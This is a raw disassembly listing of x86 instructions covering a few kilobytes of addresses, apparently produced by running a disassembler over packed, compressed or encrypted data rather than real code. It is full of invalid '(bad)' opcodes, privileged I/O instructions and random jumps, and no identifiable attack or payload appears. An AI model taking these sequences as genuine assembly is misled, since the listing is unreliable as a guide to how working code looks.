  412895:	jge    0x4128de
  412897:	aam    0x27
  412899:	sahf   
  41289a:	repnz mov dh,0x32
  41289d:	sahf   
  41289e:	test   eax,0x6859ca96
  4128a3:	dec    eax
  4128a4:	mov    esi,0x146160f4
  4128a9:	shr    DWORD PTR [eax],0xae
  4128ac:	adc    eax,0x5fe844c5
  4128b1:	add    eax,0x9f2fe9e
  4128b6:	or     bh,BYTE PTR [ebx]
  4128b8:	scas   eax,DWORD PTR es:[edi]
  4128b9:	jne    0x41292c
  4128bb:	ja     0x41288f
  4128bd:	adc    DWORD PTR [ebp+0x3f],eax
  4128c0:	pop    ds
  4128c1:	loop   0x412844
  4128c3:	add    dh,BYTE PTR [ecx+0x4ee1c1c9]
  4128c9:	mov    ebx,0x58e0466e
  4128ce:	gs int3 
  4128d0:	jae    0x4128bd
  4128d2:	mov    dl,BYTE PTR [edi+eiz*2+0xb]
  4128d6:	dec    ebx
  4128d7:	mov    fs,WORD PTR [eax+0x39]
  4128da:	stos   DWORD PTR es:[edi],eax
  4128db:	sub    al,0x2b
  4128dd:	dec    ebx
  4128de:	mov    ah,BYTE PTR [ebx]
  4128e0:	adc    al,0xdc
  4128e2:	push   ebp
  4128e3:	(bad)  
  4128e4:	repz or al,0x5
  4128e7:	push   es
  4128e8:	ret    0xfe0b
  4128eb:	jnp    0x4128ab
  4128ed:	ins    DWORD PTR es:[edi],dx
  4128ee:	imul   eax,DWORD PTR [esp+eiz*2],0xf86e1890
  4128f5:	cli    
  4128f6:	gs sub al,0x29
  4128f9:	push   eax
  4128fa:	cmc    
  4128fb:	sbb    DWORD PTR ds:0x3968dad6,esi
  412901:	loopne 0x4128f5
  412903:	fbstp  TBYTE PTR [eax-0x9f47a3b]
  412909:	dec    esp
  41290a:	pop    edi
  41290b:	dec    edx
  41290c:	retf   0x4df5
  41290f:	sub    eax,0x807ea895
  412914:	add    al,0x9c
  412916:	xor    BYTE PTR [esi+0x606c7787],0x7e
  41291d:	jmp    0x4127:0xce6fa230
  412924:	leave  
  412925:	mov    dl,BYTE PTR [ebp+0x588e3d18]
  41292b:	pushf  
  41292c:	jp     0x41298b
  41292e:	out    dx,al
  41292f:	or     cl,BYTE PTR [ebp-0x775cc737]
  412935:	pop    eax
  412936:	stos   DWORD PTR es:[edi],eax
  412937:	and    ecx,DWORD PTR [ebp+0x13cf6dd3]
  41293d:	mov    ds:0xae3d68f3,eax
  412942:	lds    ebx,FWORD PTR [ebx+0x6a]
  412945:	adc    al,0xa2
  412947:	cmp    al,0x68
  412949:	aam    0xf5
  41294b:	in     al,0x43
  41294d:	push   ebp
  41294e:	fwait
  41294f:	(bad)  
  412950:	hlt    
  412951:	jnp    0x4128db
  412953:	data16 out 0xf2,al
  412956:	and    bh,BYTE PTR gs:[ebp-0x14a496f1]
  41295d:	stos   DWORD PTR es:[edi],eax
  41295e:	mov    eax,0xf900e496
  412963:	xor    eax,0x800d551a
  412968:	cli    
  412969:	mov    DWORD PTR [edx],0x7295e141
  41296f:	push   esi
  412970:	dec    edi
  412971:	mov    eax,0x9ceb994d
  412976:	cdq    
  412977:	je     0x41291e
  412979:	(bad)  
  41297a:	or     DWORD PTR [eax],esi
  41297c:	xchg   edx,eax
  41297d:	ret    0xc703
  412980:	inc    ebx
  412981:	test   dl,dl
  412983:	sbb    ebx,DWORD PTR [esi+0x559597c1]
  412989:	sar    BYTE PTR [esi+0x11],0x93
  41298d:	in     al,0x29
  41298f:	mov    edi,0x767a216b
  412994:	mov    eax,0x2e1f4bb0
  412999:	iret   
  41299a:	mov    al,0xce
  41299c:	popf   
  41299d:	jp     0x4129ca
  41299f:	test   eax,0x48b6566e
  4129a4:	xchg   edx,eax
  4129a5:	dec    ebp
  4129a6:	std    
  4129a7:	in     al,dx
  4129a8:	mov    eax,0xae0cb4db
  4129ad:	jbe    0x412971
  4129af:	aas    
  4129b0:	outs   dx,DWORD PTR ds:[esi]
  4129b1:	leave  
  4129b2:	cdq    
  4129b3:	push   ecx
  4129b4:	xchg   esp,eax
  4129b5:	jp     0x4129aa
  4129b7:	mov    ebp,DWORD PTR [eax]
  4129b9:	mov    eax,0x3ddfef29
  4129be:	into   
  4129bf:	mov    bl,0x98
  4129c1:	mov    eax,ds:0x9192a7c
  4129c6:	cmp    ecx,ebx
  4129c8:	or     al,0x59
  4129ca:	rcl    ecx,cl
  4129cc:	push   es
  4129cd:	or     eax,0xed927f8
  4129d2:	fidiv  WORD PTR [esi-0x30]
  4129d5:	or     al,0xec
  4129d7:	fwait
  4129d8:	sub    eax,0x22aaa341
  4129dd:	sahf   
  4129de:	data16 jno 0x412a5d
  4129e1:	mov    esi,0x8f72df6f
  4129e6:	clc    
  4129e7:	sub    dl,bl
  4129e9:	imul   ebx,DWORD PTR [ebx],0x557099ed
  4129ef:	pop    esp
  4129f0:	sub    esp,ebp
  4129f2:	and    esi,DWORD PTR [ecx+eax*8-0x1b54aa5d]
  4129f9:	outs   dx,DWORD PTR ds:[esi]
  4129fa:	ret    
  4129fb:	xor    eax,0xb26c632e
  412a00:	push   eax
  412a01:	sub    eax,DWORD PTR [ecx-0x3]
  412a04:	xchg   esp,eax
  412a05:	xchg   ebp,eax
  412a06:	xchg   esp,eax
  412a07:	ds or  al,0x9b
  412a0a:	ins    DWORD PTR es:[edi],dx
  412a0b:	cmp    BYTE PTR [edi],dl
  412a0d:	adc    DWORD PTR [edx+0x13234227],eax
  412a13:	lea    ebp,[eax]
  412a15:	popf   
  412a16:	mov    ss,ebx
  412a18:	das    
  412a19:	test   DWORD PTR [esi],esi
  412a1b:	std    
  412a1c:	xor    ah,BYTE PTR ds:[eax+esi*2]
  412a20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a21:	or     esi,DWORD PTR [ecx+0x10]
  412a24:	mov    ebx,0xd828a706
  412a29:	mov    cl,0x36
  412a2b:	leave  
  412a2c:	pop    ebx
  412a2d:	iret   
  412a2e:	ror    esp,0x3d
  412a31:	add    BYTE PTR [esi+edx*2],0xb6
  412a35:	pop    edi
  412a36:	cli    
  412a37:	xor    WORD PTR [eax+eax*2+0x7c0b2db],bx
  412a3f:	mov    edi,DWORD PTR ds:0xd1b6d65e
  412a45:	mov    al,ds:0x5955346f
  412a4a:	add    ch,BYTE PTR [esi+0x14]
  412a4d:	dec    eax
  412a4e:	fsubr  QWORD PTR [edi-0x45]
  412a51:	xchg   ebp,eax
  412a52:	nop
  412a53:	mov    ebx,0x95a38458
  412a58:	test   al,0x85
  412a5a:	inc    edi
  412a5b:	hlt    
  412a5c:	mov    edi,0x7da75fa1
  412a61:	std    
  412a62:	scas   al,BYTE PTR es:[edi]
  412a63:	jo     0x412a28
  412a65:	mov    edx,0xf8fd6c82
  412a6a:	sub    edx,DWORD PTR [edi]
  412a6c:	pop    ebp
  412a6d:	cs int3 
  412a6f:	aaa    
  412a70:	xchg   ecx,eax
  412a71:	dec    DWORD PTR [eax-0x21]
  412a74:	inc    ecx
  412a75:	shl    DWORD PTR [ecx+0x244efcf3],0xd8
  412a7c:	and    ah,BYTE PTR [edx]
  412a7e:	das    
  412a7f:	or     ch,BYTE PTR [edi-0x362c48cf]
  412a85:	cwde   
  412a86:	cld    
  412a87:	add    BYTE PTR [ecx-0x36f804c2],dh
  412a8d:	or     DWORD PTR ds:[ecx],0x10178ba1
  412a94:	cmp    DWORD PTR [ebx],ebx
  412a96:	stc    
  412a97:	repnz and al,0xf6
  412a9a:	xchg   esi,eax
  412a9b:	shl    BYTE PTR [edx-0x75],cl
  412a9e:	int    0x29
  412aa0:	in     al,dx
  412aa1:	jnp    0x412a6c
  412aa3:	push   eax
  412aa4:	adc    ah,ch
  412aa6:	jo     0x412a48
  412aa8:	jge    0x412ab8
  412aaa:	mov    al,ds:0xcf044ca6
  412aaf:	jp     0x412a6b
  412ab1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ab2:	test   DWORD PTR [ebp+ebp*1+0x52],ebp
  412ab6:	mov    edx,ecx
  412ab8:	jbe    0x412b00
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	cdq    
  412abc:	stos   DWORD PTR es:[edi],eax
  412abd:	outs   dx,BYTE PTR ds:[esi]
  412abe:	lods   eax,DWORD PTR ds:[esi]
  412abf:	jns    0x412b32
  412ac1:	dec    esp
  412ac2:	aas    
  412ac3:	add    BYTE PTR ds:0xad62c413,bh
  412ac9:	add    edx,DWORD PTR [ecx+0x6ec6a1b5]
  412acf:	cmp    al,0xbd
  412ad1:	jl     0x412a7c
  412ad3:	pushf  
  412ad4:	in     eax,dx
  412ad5:	stos   BYTE PTR es:[edi],al
  412ad6:	popf   
  412ad7:	jge    0x412b05
  412ad9:	popa   
  412ada:	icebp  
  412adb:	dec    edi
  412adc:	pop    ecx
  412add:	mov    ebp,0xa39e5246
  412ae2:	pop    esp
  412ae3:	(bad)  
  412ae4:	push   eax
  412ae5:	adc    ebp,DWORD PTR [ecx-0x2d]
  412ae8:	(bad)  
  412ae9:	dec    ecx
  412aea:	ins    BYTE PTR es:[edi],dx
  412aeb:	sbb    ch,BYTE PTR [esi]
  412aed:	das    
  412aee:	rcl    DWORD PTR [eax-0x19d42c15],0x3f
  412af5:	xor    esp,DWORD PTR [ecx+0x37]
  412af8:	and    DWORD PTR [edi+0x78727aef],0x3882734d
  412b02:	aas    
  412b03:	mov    dl,0x3c
  412b05:	adc    eax,DWORD PTR [ebp+0x6c25a05b]
  412b0b:	cmc    
  412b0c:	cmp    al,0xe4
  412b0e:	fdivr  DWORD PTR [ecx]
  412b10:	mov    ebx,0x18223250
  412b15:	or     BYTE PTR [edi+0x2d],0x3a
  412b19:	hlt    
  412b1a:	out    dx,eax
  412b1b:	clc    
  412b1c:	mov    cl,0x55
  412b1e:	mov    ds:0x10632a7d,al
  412b23:	mov    esi,0xee9630f5
  412b28:	adc    dh,BYTE PTR [eax+0x61]
  412b2b:	jb     0x412b1d
  412b2d:	aad    0x5
  412b2f:	(bad)  
  412b30:	mov    al,ds:0x67c7637e
  412b35:	shr    DWORD PTR [edx+0x49],cl
  412b38:	je     0x412b05
  412b3a:	ret    0x6ac7
  412b3d:	adc    al,0xb9
  412b3f:	repz out dx,eax
  412b41:	push   edx
  412b42:	das    
  412b43:	ds in  eax,0x54
  412b46:	mov    ah,0xf7
  412b48:	cmc    
  412b49:	xchg   ebp,eax
  412b4a:	sub    eax,0xe7ba30a4
  412b4f:	push   esi
  412b50:	mov    dl,0xd1
  412b52:	dec    esi
  412b53:	push   esi
  412b54:	mov    eax,0x92637974
  412b59:	fisub  DWORD PTR [edx]
  412b5b:	ss in  al,dx
  412b5d:	mov    ch,0xf0
  412b5f:	mov    al,ds:0xf5bbe8fe
  412b64:	sbb    BYTE PTR [edi+0x4366b09a],dl
  412b6a:	js     0x412b20
  412b6c:	test   edx,esp
  412b6e:	pusha  
  412b6f:	jmp    0x9c2f:0xc55d237c
  412b76:	inc    esi
  412b77:	push   eax
  412b78:	into   
  412b79:	push   edi
  412b7a:	sbb    BYTE PTR [eax],0x9e
  412b7d:	ret    0x3d82
  412b80:	mov    DWORD PTR [eax+0x298756bb],ebx
  412b86:	mov    eax,0x98c8f7ef
  412b8b:	adc    eax,0xe6e08b83
  412b90:	arpl   WORD PTR [ecx],bx
  412b92:	div    bh
  412b94:	inc    ebx
  412b95:	mov    ebp,0xfd99ff6c
  412b9a:	pop    ecx
  412b9b:	mov    bl,0x9f
  412b9d:	fucom  st(1)
  412b9f:	dec    edi
  412ba0:	inc    ebp
  412ba1:	pop    ebp
  412ba2:	sub    dl,BYTE PTR [ecx-0x22a927a5]
  412ba8:	dec    ecx
  412ba9:	sti    
  412baa:	les    edi,FWORD PTR [eax-0x60]
  412bad:	lock push ebp
  412baf:	cs (bad) 
  412bb1:	cmc    
  412bb2:	sub    DWORD PTR [ebx+ecx*2+0x36],esp
  412bb6:	ss push es
  412bb8:	mov    ah,0xf6
  412bba:	push   ebp
  412bbb:	loope  0x412bcf
  412bbd:	mov    esi,0xcfccf510
  412bc2:	(bad)  [edi+0x5857c752]
  412bc8:	inc    ebx
  412bc9:	scas   eax,DWORD PTR es:[edi]
  412bca:	and    BYTE PTR [edx+0x53],bl
  412bcd:	ret    
  412bce:	test   al,0xda
  412bd0:	xchg   ebx,eax
  412bd1:	sbb    DWORD PTR [edi+0x51],ecx
  412bd4:	inc    edi
  412bd5:	lods   eax,DWORD PTR ds:[esi]
  412bd6:	mov    dl,0xb
  412bd8:	(bad)  
  412bd9:	lods   al,BYTE PTR ds:[esi]
  412bda:	(bad)  
  412bdb:	rol    ch,cl
  412bdd:	sbb    ebp,DWORD PTR [ecx]
  412bdf:	adc    BYTE PTR [edi-0x18],0x54
  412be3:	cli    
  412be4:	in     al,dx
  412be5:	mov    edi,0x8ab99f78
  412bea:	xlat   BYTE PTR ds:[ebx]
  412beb:	mov    ah,0x4
  412bed:	fcmovne st,st(7)
  412bef:	cmp    ebx,esp
  412bf1:	retf   0xe595
  412bf4:	mov    BYTE PTR [eax],ch
  412bf6:	mov    bl,0x10
  412bf8:	push   edx
  412bf9:	daa    
  412bfa:	dec    esp
  412bfb:	dec    ebp
  412bfc:	xchg   edi,eax
  412bfd:	dec    edi
  412bfe:	inc    ebp
  412bff:	inc    ecx
  412c00:	imul   edi,DWORD PTR [ebp+0x30],0x66ef060a
  412c07:	pop    esi
  412c08:	(bad)  
  412c09:	pop    ds
  412c0a:	or     dh,BYTE PTR [esi+edx*8]
  412c0d:	add    bl,ch
  412c0f:	or     cl,ah
  412c11:	cli    
  412c12:	repnz xor esp,DWORD PTR [bx+si]
  412c16:	mov    WORD PTR [esi-0x38],gs
  412c19:	push   eax
  412c1a:	nop
  412c1b:	aas    
  412c1c:	mov    eax,ds:0x477e61d8
  412c21:	lods   al,BYTE PTR ds:[esi]
  412c22:	test   BYTE PTR [esi+0x263844b1],cl
  412c28:	mov    ds:0xfcfbe4ea,eax
  412c2d:	push   ebp
  412c2e:	mov    ebp,0xecc8b705
  412c33:	mov    edi,0x9b84b8ab
  412c38:	inc    ah
  412c3a:	xor    al,0x6f
  412c3c:	arpl   WORD PTR [ebp+0x5d],bx
  412c3f:	scas   al,BYTE PTR es:[edi]
  412c40:	mov    eax,0x50fa8c3b
  412c45:	ins    DWORD PTR es:[edi],dx
  412c46:	aad    0xfd
  412c48:	push   es
  412c49:	add    esi,eax
  412c4b:	xor    ch,BYTE PTR [ecx+0x4c]
  412c4e:	lds    edx,FWORD PTR [ebp-0x44b4761d]
  412c54:	icebp  
  412c55:	ret    0xf3bd
  412c58:	inc    esp
  412c59:	jmp    0xefb70b9e
  412c5e:	pop    edx
  412c5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c60:	mov    ebx,0x952841f6
  412c65:	stos   BYTE PTR es:[edi],al
  412c66:	js     0x412ca0
  412c68:	mov    cl,BYTE PTR [ecx-0x66]
  412c6b:	pop    ebp
  412c6c:	xor    BYTE PTR [edx+0x42],0xdb
  412c70:	nop
  412c71:	int3   
  412c72:	int3   
  412c73:	add    al,0x5e
  412c75:	stc    
  412c76:	scas   al,BYTE PTR es:[edi]
  412c77:	dec    esp
  412c78:	cmp    esi,edx
  412c7a:	rol    BYTE PTR [ebx],0x90
  412c7d:	and    DWORD PTR [edi],0x2d
  412c80:	cmp    ebx,esp
  412c82:	mov    eax,eax
  412c84:	inc    ebp
  412c85:	and    eax,0xf59531cc
  412c8a:	imul   eax,DWORD PTR [ebp+0x69debd3f],0xffffffec
  412c91:	in     al,0x8c
  412c93:	stc    
  412c94:	mov    al,ds:0xa7e2662e
  412c99:	jb     0x412cc8
  412c9b:	mov    esi,0xdbaf5219
  412ca0:	aaa    
  412ca1:	in     al,0x49
  412ca3:	jnp    0x412c5d
  412ca5:	mov    edi,eax
  412ca7:	jmp    0x9b29fa20
  412cac:	std    
  412cad:	and    DWORD PTR [esi],edi
  412caf:	push   es
  412cb0:	inc    edi
  412cb1:	or     DWORD PTR [ebp+edi*8+0x3b],ecx
  412cb5:	mov    edi,ecx
  412cb7:	fwait
  412cb8:	pusha  
  412cb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cba:	addr16 popa 
  412cbc:	aam    0x9a
  412cbe:	xor    ch,BYTE PTR [esi+0x64]
  412cc1:	dec    eax
  412cc2:	aas    
  412cc3:	sahf   
  412cc4:	xchg   edi,eax
  412cc5:	test   bh,bh
  412cc7:	lock and bl,BYTE PTR [edx]
  412cca:	add    DWORD PTR [edi+0x9aadf4c],esi
  412cd0:	jb     0x39483852
  412cd6:	mov    al,bl
  412cd8:	pop    edx
  412cd9:	xlat   BYTE PTR ds:[ebx]
  412cda:	rcl    BYTE PTR ds:0x1e6996c6,0x2f
  412ce1:	push   0xb63884b1
  412ce6:	sbb    al,0x50
  412ce8:	sbb    al,0x60
  412cea:	in     eax,dx
  412ceb:	ja     0x412d52
  412ced:	int3   
  412cee:	in     al,dx
  412cef:	jle    0x412d31
  412cf1:	and    al,0x71
  412cf3:	dec    ecx
  412cf4:	mov    cl,0xfd
  412cf6:	aas    
  412cf7:	ds xchg esi,eax
  412cf9:	add    eax,0x7c4915d5
  412cfe:	cs cdq 
  412d00:	retf   0x4079
  412d03:	(bad)  
  412d05:	cdq    
  412d06:	adc    ebx,DWORD PTR [eax-0x28]
  412d09:	push   esp
  412d0a:	sbb    bl,BYTE PTR [eax+0x71]
  412d0d:	push   0x16cd760f
  412d12:	jmp    0x412ce4
  412d14:	sub    al,0xa2
  412d16:	mov    BYTE PTR [edx+0x2fe1868e],cl
  412d1c:	jg     0x412d6f
  412d1e:	xor    eax,0x73ce757d
  412d23:	(bad)  
  412d24:	jp     0x412d79
  412d26:	(bad)  
  412d27:	cmp    bl,dl
  412d29:	dec    esi
  412d2a:	mov    dl,0xb3
  412d2c:	xor    eax,ebx
  412d2e:	add    dh,BYTE PTR [ebp+0x42]
  412d31:	leave  
  412d32:	(bad)  
  412d34:	outs   dx,DWORD PTR ds:[esi]
  412d35:	cmp    DWORD PTR [esi+0x1edbd4c6],ebx
  412d3b:	ret    0x31ff
  412d3e:	mov    esi,0xa1662cad
  412d43:	out    dx,eax
  412d44:	mov    ah,0x87
  412d46:	push   ds
  412d47:	jmp    0x412d93
  412d49:	xchg   edx,eax
  412d4a:	jl     0x412cf3
  412d4c:	jno    0x412d76
  412d4e:	sub    BYTE PTR [ebx+edi*8],0xaf
  412d52:	push   esp
  412d53:	ins    DWORD PTR es:[edi],dx
  412d54:	lods   eax,DWORD PTR ds:[esi]
  412d55:	sbb    ah,bl
  412d57:	and    eax,0x957a21ab
  412d5c:	cmp    al,0xf8
  412d5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d5f:	fidivr WORD PTR [ecx-0x1a13cecb]
  412d65:	jbe    0x412ddd
  412d67:	or     cl,BYTE PTR [edi]
  412d69:	and    BYTE PTR [ebp+0x50],ah
  412d6c:	push   ebp
  412d6d:	pop    ecx
  412d6e:	fisub  DWORD PTR [ecx]
  412d70:	cmp    eax,0x1b0c3f12
  412d75:	jne    0x412d69
  412d77:	mov    ebx,0x77fb47ea
  412d7c:	aam    0x6
  412d7e:	mov    bl,0x7d
  412d80:	inc    edi
  412d81:	call   0x2ead:0x88589b4d
  412d88:	mov    esi,0x57a4a837
  412d8d:	and    BYTE PTR [esi],ah
  412d8f:	addr16 push edi
  412d91:	clc    
  412d92:	adc    ebx,ebx
  412d94:	inc    esp
  412d95:	xchg   BYTE PTR [edx+0x43bfec79],ah
  412d9b:	jnp    0x412ddb
  412d9d:	mov    al,0x55
  412d9f:	add    BYTE PTR [edi],al
  412da1:	sbb    al,0x62
  412da3:	fdivr  DWORD PTR ds:0xdd73f380
  412da9:	out    0x51,eax
  412dab:	mov    ecx,0xfd8e346f
  412db0:	lea    ebx,[edi]
  412db2:	es cs pop ecx
  412db5:	mov    edi,0xa5fa559
  412dba:	push   ds
  412dbb:	fld    QWORD PTR [eax]
  412dbd:	mov    esi,0x974d2781
  412dc2:	adc    edx,edx
  412dc4:	add    DWORD PTR [edi-0x895df6b],esi
  412dca:	mov    edi,0xe49895f7
  412dcf:	sub    al,0xd2
  412dd1:	(bad)  
  412dd2:	lds    ebx,FWORD PTR [esi+edi*1]
  412dd5:	and    edx,DWORD PTR [edi]
  412dd7:	sub    al,0x7c
  412dd9:	(bad)  
  412ddb:	fistp  WORD PTR [edi-0x34563b7a]
  412de1:	pop    edi
  412de2:	or     BYTE PTR [esi-0x10da5ca4],bh
  412de8:	cmp    bh,BYTE PTR [ecx+ebx*1]
  412deb:	mov    esi,0x6da8093
  412df0:	lods   eax,DWORD PTR ds:[esi]
  412df1:	add    BYTE PTR [edx],dh
  412df3:	add    eax,0x14bc9f73
  412df8:	(bad)  
  412df9:	mov    edx,0x1c8cc824
  412dfe:	or     edi,DWORD PTR [ebx-0x20]
  412e01:	jb     0x412e25
  412e03:	cmc    
  412e04:	aas    
  412e05:	repnz out dx,eax
  412e07:	fstp   QWORD PTR [edx+0x1b612e7f]
  412e0d:	jle    0x412dca
  412e0f:	dec    eax
  412e10:	xchg   bh,ah
  412e12:	mov    bh,0xfe
  412e15:	pop    ss
  412e16:	data16 add al,0x56
  412e19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e1a:	jg     0x412e03
  412e1c:	jp     0x412dae
  412e1e:	adc    eax,0x3369abb
  412e23:	imul   esp,DWORD PTR [ebp-0x2c],0x37ad4c21
  412e2a:	stos   DWORD PTR es:[edi],eax
  412e2b:	and    edi,DWORD PTR [ebx+0x15]
  412e2e:	push   edx
  412e2f:	les    esp,FWORD PTR [esi-0x1b]
  412e32:	clc    
  412e33:	lods   eax,DWORD PTR ds:[esi]
  412e34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e35:	xor    ecx,edi
  412e37:	fbstp  TBYTE PTR [edi-0x2085462a]
  412e3d:	mov    eax,0xe98828a7
  412e42:	mov    cl,0xe9
  412e44:	(bad)  [edx+0x204cfa7c]
  412e4a:	push   0x5db2c38d
  412e4f:	inc    ecx
  412e50:	mov    dl,0x9e
  412e52:	(bad)  
  412e53:	test   al,0x95
  412e55:	into   
  412e56:	sub    DWORD PTR [ebp-0x47adf769],ebp
  412e5c:	or     dh,BYTE PTR [ebx+0x21]
  412e5f:	ret    0x954b
  412e62:	mov    ?,esp
  412e64:	and    DWORD PTR [ecx],edx
  412e66:	mov    eax,0xc21cee73
  412e6b:	sub    BYTE PTR [esi],dh
  412e6d:	test   DWORD PTR [ebx+0x46],esi
  412e70:	out    dx,eax
  412e71:	pushf  
  412e72:	xchg   ebx,eax
  412e73:	cmp    BYTE PTR [ebp+0x27],al
  412e76:	sub    BYTE PTR [esi],0x27
  412e79:	mov    ds:0xab61b851,eax
  412e7e:	ja     0x412e18
  412e80:	dec    ecx
  412e81:	push   ebx
  412e82:	xor    edi,DWORD PTR [ebx]
  412e84:	ins    DWORD PTR es:[edi],dx
  412e85:	mov    dl,0xd0
  412e87:	sti    
  412e88:	mov    edx,0x8b3ba08a
  412e8d:	mov    edi,0xd4fb58c0
  412e92:	test   eax,0x2db93184
  412e97:	pusha  
  412e98:	cs addr16 lahf 
  412e9b:	add    eax,0xbcfbe9e4
  412ea0:	xchg   ecx,eax
  412ea1:	jmp    0x90f61bef
  412ea6:	xchg   edx,eax
  412ea7:	dec    esp
  412ea8:	jmp    0x62d7:0xa10fce73
  412eaf:	mov    ebp,0xf10915d1
  412eb4:	(bad)  
  412eb5:	cmp    al,BYTE PTR [eax+0x17818f33]
  412ebb:	adc    DWORD PTR [ecx],ecx
  412ebd:	jge    0x412f37
  412ebf:	mov    esi,0x8f365891
  412ec4:	scas   al,BYTE PTR es:[edi]
  412ec5:	mov    dh,0x3
  412ec7:	and    al,0x19
  412ec9:	and    al,0xde
  412ecb:	mov    ah,0x65
  412ecd:	(bad)  
  412ece:	cmp    eax,0x88d25e1b
  412ed3:	sar    ebx,cl
  412ed5:	fadd   QWORD PTR [ebx]
  412ed7:	pop    ds
  412ed8:	retf   0x32ad
  412edb:	dec    ecx
  412edc:	out    0x3b,eax
  412ede:	pop    edi
  412edf:	ds fwait
  412ee1:	or     cl,bl
  412ee3:	lock dec ebp
  412ee5:	in     eax,dx
  412ee6:	ret    0x4fcb
  412ee9:	into   
  412eea:	add    DWORD PTR [esi+ebx*2-0x3bbbe3ee],ebx
  412ef1:	add    al,0x26
  412ef3:	in     al,dx
  412ef4:	inc    esi
  412ef5:	jno    0x412ec7
  412ef7:	stos   BYTE PTR es:[edi],al
  412ef8:	inc    eax
  412ef9:	cwde   
  412efa:	aas    
  412efb:	jle    0x412f38
  412efd:	idiv   BYTE PTR [edi+eax*4-0x269d13bb]
  412f04:	sub    eax,0x461c6e31
  412f09:	pop    ss
  412f0a:	mov    ecx,0xb4528e45
  412f0f:	xlat   BYTE PTR ds:[ebx]
  412f10:	por    mm5,QWORD PTR [edi+0x32]
  412f14:	(bad)  
  412f15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f16:	mov    esp,DWORD PTR ds:0x56e8ddba
  412f1c:	add    eax,0x30ce256a
  412f21:	inc    edx
  412f22:	cmp    DWORD PTR es:[eax-0x60665ded],0xf7e2f54a
  412f2d:	scas   eax,DWORD PTR es:[edi]
  412f2e:	(bad)  [edx]
  412f30:	cmc    
  412f31:	cli    
  412f32:	imul   eax,esi,0xffffffaa
  412f35:	int    0x17
  412f37:	lods   eax,DWORD PTR ds:[esi]
  412f38:	xchg   BYTE PTR [esi-0x34],dh
  412f3b:	jg     0x412ecd
  412f3d:	pop    eax
  412f3e:	mov    bh,0xd
  412f40:	push   edx
  412f41:	ss and ebp,esi
  412f44:	cli    
  412f45:	sub    edx,edi
  412f47:	add    BYTE PTR es:[ebp+0x706dd766],dl
  412f4e:	in     eax,0xe
  412f50:	adc    BYTE PTR [ebp+0x3774b25],dh
  412f56:	(bad)  
  412f57:	iret   
  412f58:	sub    al,0x46
  412f5a:	mov    ds:0xb6230243,al
  412f5f:	scas   eax,DWORD PTR es:[edi]
  412f60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f61:	adc    eax,0xee9f1a6
  412f66:	daa    
  412f67:	out    dx,eax
  412f68:	arpl   WORD PTR [eax+eax*4-0x3f1cb52a],bp
  412f6f:	rcr    BYTE PTR [ecx-0x7],1
  412f72:	(bad)  
  412f73:	jo     0x412f66
  412f75:	adc    esi,DWORD PTR [ecx]
  412f77:	mov    bh,0x8a
  412f79:	mov    eax,0x5dc01c2a
  412f7e:	std    
  412f7f:	inc    ecx
  412f80:	sbb    dh,BYTE PTR [edx]
  412f82:	mov    dh,0x4d
  412f84:	(bad)  [ebx-0x2f]
  412f87:	stc    
  412f88:	aad    0xa7
  412f8a:	push   ds
  412f8b:	(bad)  
  412f8d:	dec    ecx
  412f8e:	icebp  
  412f8f:	xor    eax,0x7f69dc8f
  412f94:	push   ds
  412f95:	fisub  WORD PTR [edx+0x439f4845]
  412f9b:	nop
  412f9c:	sahf   
  412f9d:	jl     0x412fd7
  412f9f:	retf   0x4fb5
  412fa2:	addr16 data16 mov dl,0xa0
  412fa6:	or     BYTE PTR [edi-0x1ddcb712],cl
  412fac:	jge    0x412f95
  412fae:	dec    edx
  412faf:	cmp    ebp,DWORD PTR [esi]
  412fb1:	rcl    DWORD PTR [edi-0x7ca5bdd1],1
  412fb7:	add    eax,0x91849da
  412fbc:	push   esi
  412fbd:	sub    ebp,ebx
  412fbf:	cmp    edi,0x3e
  412fc2:	dec    ebp
  412fc3:	jnp    0x412fc7
  412fc5:	xchg   ebx,eax
  412fc6:	ror    DWORD PTR [ebp+ecx*4+0x2e8fff8f],1
  412fcd:	xchg   esp,eax
  412fce:	adc    al,0xc8
  412fd0:	das    
  412fd1:	mov    ch,0xdf
  412fd3:	fwait
  412fd4:	add    cl,al
  412fd6:	fxch   st(6)
  412fd8:	cld    
  412fd9:	pop    esp
  412fda:	shl    dl,0x4d
  412fdd:	mov    edx,0x3ff604c6
  412fe2:	cmp    BYTE PTR [esi+ecx*1+0x5c],bh
  412fe6:	imul   ebp,DWORD PTR [edx+0x72caa534],0x566723a4
  412ff0:	js     0x41305c
  412ff2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ff3:	mov    ds:0x2438b917,eax
  412ff8:	sub    BYTE PTR [edx+0x74fd8138],ch
  412ffe:	sbb    DWORD PTR ds:[esp+esi*4],0xffffffd2
  413003:	push   esi
  413004:	aas    
  413005:	xchg   ebx,eax
  413006:	mov    DWORD PTR [edx+0x2a],0x36654739
  41300d:	inc    esp
  41300e:	(bad)  
  413010:	sbb    DWORD PTR [ecx-0x4a48568b],0x667a5f12
  41301a:	mov    edx,0x6f62beb8
  41301f:	les    edx,FWORD PTR [edx+ebx*2+0x7f]
  413023:	data16 out 0x19,al
  413026:	or     al,dl
  413028:	and    cl,BYTE PTR [ecx]
  41302a:	lds    ecx,FWORD PTR [edi]
  41302c:	mov    BYTE PTR [esi+ebp*2],bh
  41302f:	retf   
  413030:	jb     0x413006
  413032:	mov    ebp,DWORD PTR [eax]
  413034:	pop    esi
  413035:	sbb    DWORD PTR [ecx-0x4d3a6f24],ebx
  41303b:	and    ecx,DWORD PTR [edx+0x67]
  41303e:	daa    
  41303f:	xor    BYTE PTR [ebx],0x2c
  413042:	sbb    BYTE PTR [edx+0x1c4e376d],dl
  413048:	jns    0x413014
  41304a:	inc    ebx
  41304b:	loope  0x41308f
  41304d:	mov    ds:0x734e17ed,al
  413052:	jae    0x412ff1
  413054:	pusha  
  413055:	in     al,0x62
  413057:	out    dx,eax
  413058:	(bad)  [ebx]
  41305a:	or     DWORD PTR [ebx],ebp
